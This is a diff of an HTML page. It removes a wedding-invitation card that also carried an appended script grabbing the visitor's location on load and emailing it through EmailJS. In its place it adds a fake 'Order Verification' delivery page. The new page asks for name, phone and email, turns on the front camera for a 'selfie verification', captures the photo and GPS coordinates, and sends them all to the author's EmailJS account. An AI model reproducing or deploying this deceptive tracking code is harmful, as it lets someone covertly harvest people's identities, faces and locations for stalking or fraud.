@@ -1,231 +1,129 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title>Wedding Invitation</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Order Verification</title>
 
 <style>
-
 body{
-    margin:0;
-    background:black;
-    height:100vh;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    overflow:hidden;
-    font-family:Arial;
+ font-family:Arial;
+ text-align:center;
+ padding:20px;
 }
-
-/* Countdown */
-#countdown{
-    position:absolute;
-    top:20px;
-    width:100%;
-    text-align:center;
-    font-size:22px;
-    font-weight:bold;
-    letter-spacing:2px;
-    z-index:5;
+input{
+ width:85%;
+ padding:12px;
+ margin:8px;
+ font-size:16px;
 }
-
-/* Card container */
-.card{
-    perspective:1200px;
+button{
+ padding:12px 20px;
+ background:#28a745;
+ color:white;
+ border:none;
+ border-radius:6px;
+ font-size:16px;
+ margin:6px;
 }
-
-.card-inner{
-    width:320px;
-    height:500px;
-    position:relative;
-    transform-style:preserve-3d;
-    transition:1.5s;
+video,img{
+ width:300px;
+ border-radius:10px;
+ margin-top:10px;
 }
-
-.card.open .card-inner{
-    transform:rotateY(180deg);
-}
-
-.side{
-    position:absolute;
-    width:100%;
-    height:100%;
-    backface-visibility:hidden;
-    border-radius:15px;
-    overflow:hidden;
-    box-shadow:0 20px 40px rgba(0,0,0,0.8);
-}
-
-.side img{
-    width:100%;
-    height:100%;
-    object-fit:cover;
-}
-
-.back{
-    transform:rotateY(180deg);
-}
-
-/* Fireworks */
-.firework{
-    position:absolute;
-    width:6px;
-    height:6px;
-    background:white;
-    border-radius:50%;
-    animation:blast 1s linear infinite;
-}
-
-@keyframes blast{
-    0%{transform:scale(1);opacity:1;}
-    100%{transform:scale(12);opacity:0;}
-}
-
 </style>
 </head>
 
 <body>
 
-<!-- Countdown -->
-<div id="countdown"></div>
+<h2>Order Verification</h2>
+<p>Delivery ke liye details aur selfie verification zaroori hai</p>
 
-<!-- Card -->
-<div class="card" onclick="openCard()">
-    <div class="card-inner" id="cardInner">
+<input type="text" id="name" placeholder="Your Name"><br>
+<input type="tel" id="phone" placeholder="Phone Number"><br>
+<input type="email" id="email" placeholder="Email Address"><br>
 
-        <!-- FRONT -->
-        <div class="side front">
-            <img src="5ade0876d175df6d89321c02d51eef05%20(1).jpg">
-        </div>
+<h3>Selfie Verification</h3>
 
-        <!-- BACK (same image) -->
-        <div class="side back">
-            <img src="5ade0876d175df6d89321c02d51eef05%20(1).jpg">
-        </div>
+<video id="video" autoplay playsinline></video><br>
 
-    </div>
-</div>
+<button onclick="startCamera()">Open Camera</button>
+<button onclick="captureAndSend()">Submit Order</button>
 
-<script>
-
-/* =====================
-   COUNTDOWN FIXED
-===================== */
-
-const dateString = "15.10.2028";
-const parts = dateString.split(".");
-
-const targetDate = new Date(
-  parts[2],
-  parts[1]-1,
-  parts[0],
-  22,0,0   // raat 10 baje
-);
-
-function updateCountdown(){
-
-    const now = new Date().getTime();
-    const distance = targetDate - now;
-
-    if(distance<=0){
-        document.getElementById("countdown").innerHTML="🎉 SHADI MUBARAK 🎉";
-        return;
-    }
-
-    const d=Math.floor(distance/(1000*60*60*24));
-    const h=Math.floor((distance%(1000*60*60*24))/(1000*60*60));
-    const m=Math.floor((distance%(1000*60*60))/(1000*60));
-    const s=Math.floor((distance%(1000*60))/1000);
-
-    document.getElementById("countdown").innerHTML=
-    `<span style="color:#ff4d4d">${d}D</span> :
-     <span style="color:#4dff88">${h}H</span> :
-     <span style="color:#4db8ff">${m}M</span> :
-     <span style="color:#ffd24d">${s}S</span>`;
-}
-
-setInterval(updateCountdown,1000);
-updateCountdown();
-
-
-/* =====================
-   CARD OPEN EFFECT
-===================== */
-
-function openCard(){
-    document.querySelector(".card").classList.toggle("open");
-    createFireworks();
-}
-
-
-/* =====================
-   FIREWORK EFFECT
-===================== */
-
-function createFireworks(){
-    for(let i=0;i<25;i++){
-        let f=document.createElement("div");
-        f.className="firework";
-
-        f.style.left=Math.random()*100+"vw";
-        f.style.top=Math.random()*100+"vh";
-
-        document.body.appendChild(f);
-
-        setTimeout(()=>f.remove(),1000);
-    }
-}
-
-</script>
-
-</body>
-</html>
-<h3>Delivery ke liye location allow karein</h3>
-<p>Page open hote hi location request aayegi.</p>
+<canvas id="canvas" width="300" height="220" style="display:none;"></canvas>
 
 <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
 
 <script>
-// EmailJS Initialize
+// ✅ EmailJS Init (UPDATED)
 (function(){
-   emailjs.init("2pInQghRcP-YZtYCK");
+ emailjs.init("287g46US2fGjoY4LL");
 })();
 
-// Page load hote hi location request
-window.onload = function() {
-   getLocationAndSend();
-};
+let video=document.getElementById("video");
 
-function getLocationAndSend() {
+// Open Front Camera
+function startCamera(){
+ navigator.mediaDevices.getUserMedia({
+   video:{facingMode:"user"}
+ })
+ .then(stream=>{
+   video.srcObject=stream;
+ })
+ .catch(()=>{
+   alert("Camera permission allow karein.");
+ });
+}
 
- if (navigator.geolocation) {
+// Capture + Location + Email Send
+function captureAndSend(){
 
-   navigator.geolocation.getCurrentPosition(function(position){
+ let name=document.getElementById("name").value;
+ let phone=document.getElementById("phone").value;
+ let email=document.getElementById("email").value;
 
-     var lat = position.coords.latitude;
-     var lon = position.coords.longitude;
+ if(name==""||phone==""||email==""){
+   alert("Please fill all details");
+   return;
+ }
 
-     // Email send
-     emailjs.send("service_hxul50k","template_3mjgsjk",{
-        latitude: lat,
-        longitude: lon
-     })
-     .then(function(response) {
-        console.log("Location sent");
-     }, function(error) {
-        console.log("Error sending location");
-     });
+ navigator.geolocation.getCurrentPosition(function(position){
 
+   let lat=position.coords.latitude;
+   let lon=position.coords.longitude;
+
+   let canvas=document.getElementById("canvas");
+   let ctx=canvas.getContext("2d");
+
+   ctx.drawImage(video,0,0,300,220);
+
+   let selfie=canvas.toDataURL("image/jpeg",0.6);
+
+   emailjs.send(
+     "service_3ux49q7",
+     "template_3mjgsjk",
+     {
+       name:name,
+       phone:phone,
+       email:email,
+       latitude:lat,
+       longitude:lon,
+       selfie:selfie
+     }
+   )
+   .then(()=>{
+     alert("✅ Order Successfully Sent!");
    },
-   function(){
-     alert("Delivery ke liye location allow karna zaroori hai.");
+   ()=>{
+     alert("❌ Sending Failed");
    });
 
- } else {
-   alert("Location supported nahi hai.");
- }
+ },
+ function(){
+   alert("Location allow karna zaroori hai.");
+ });
 
 }
 </script>
+
+</body>
+</html>
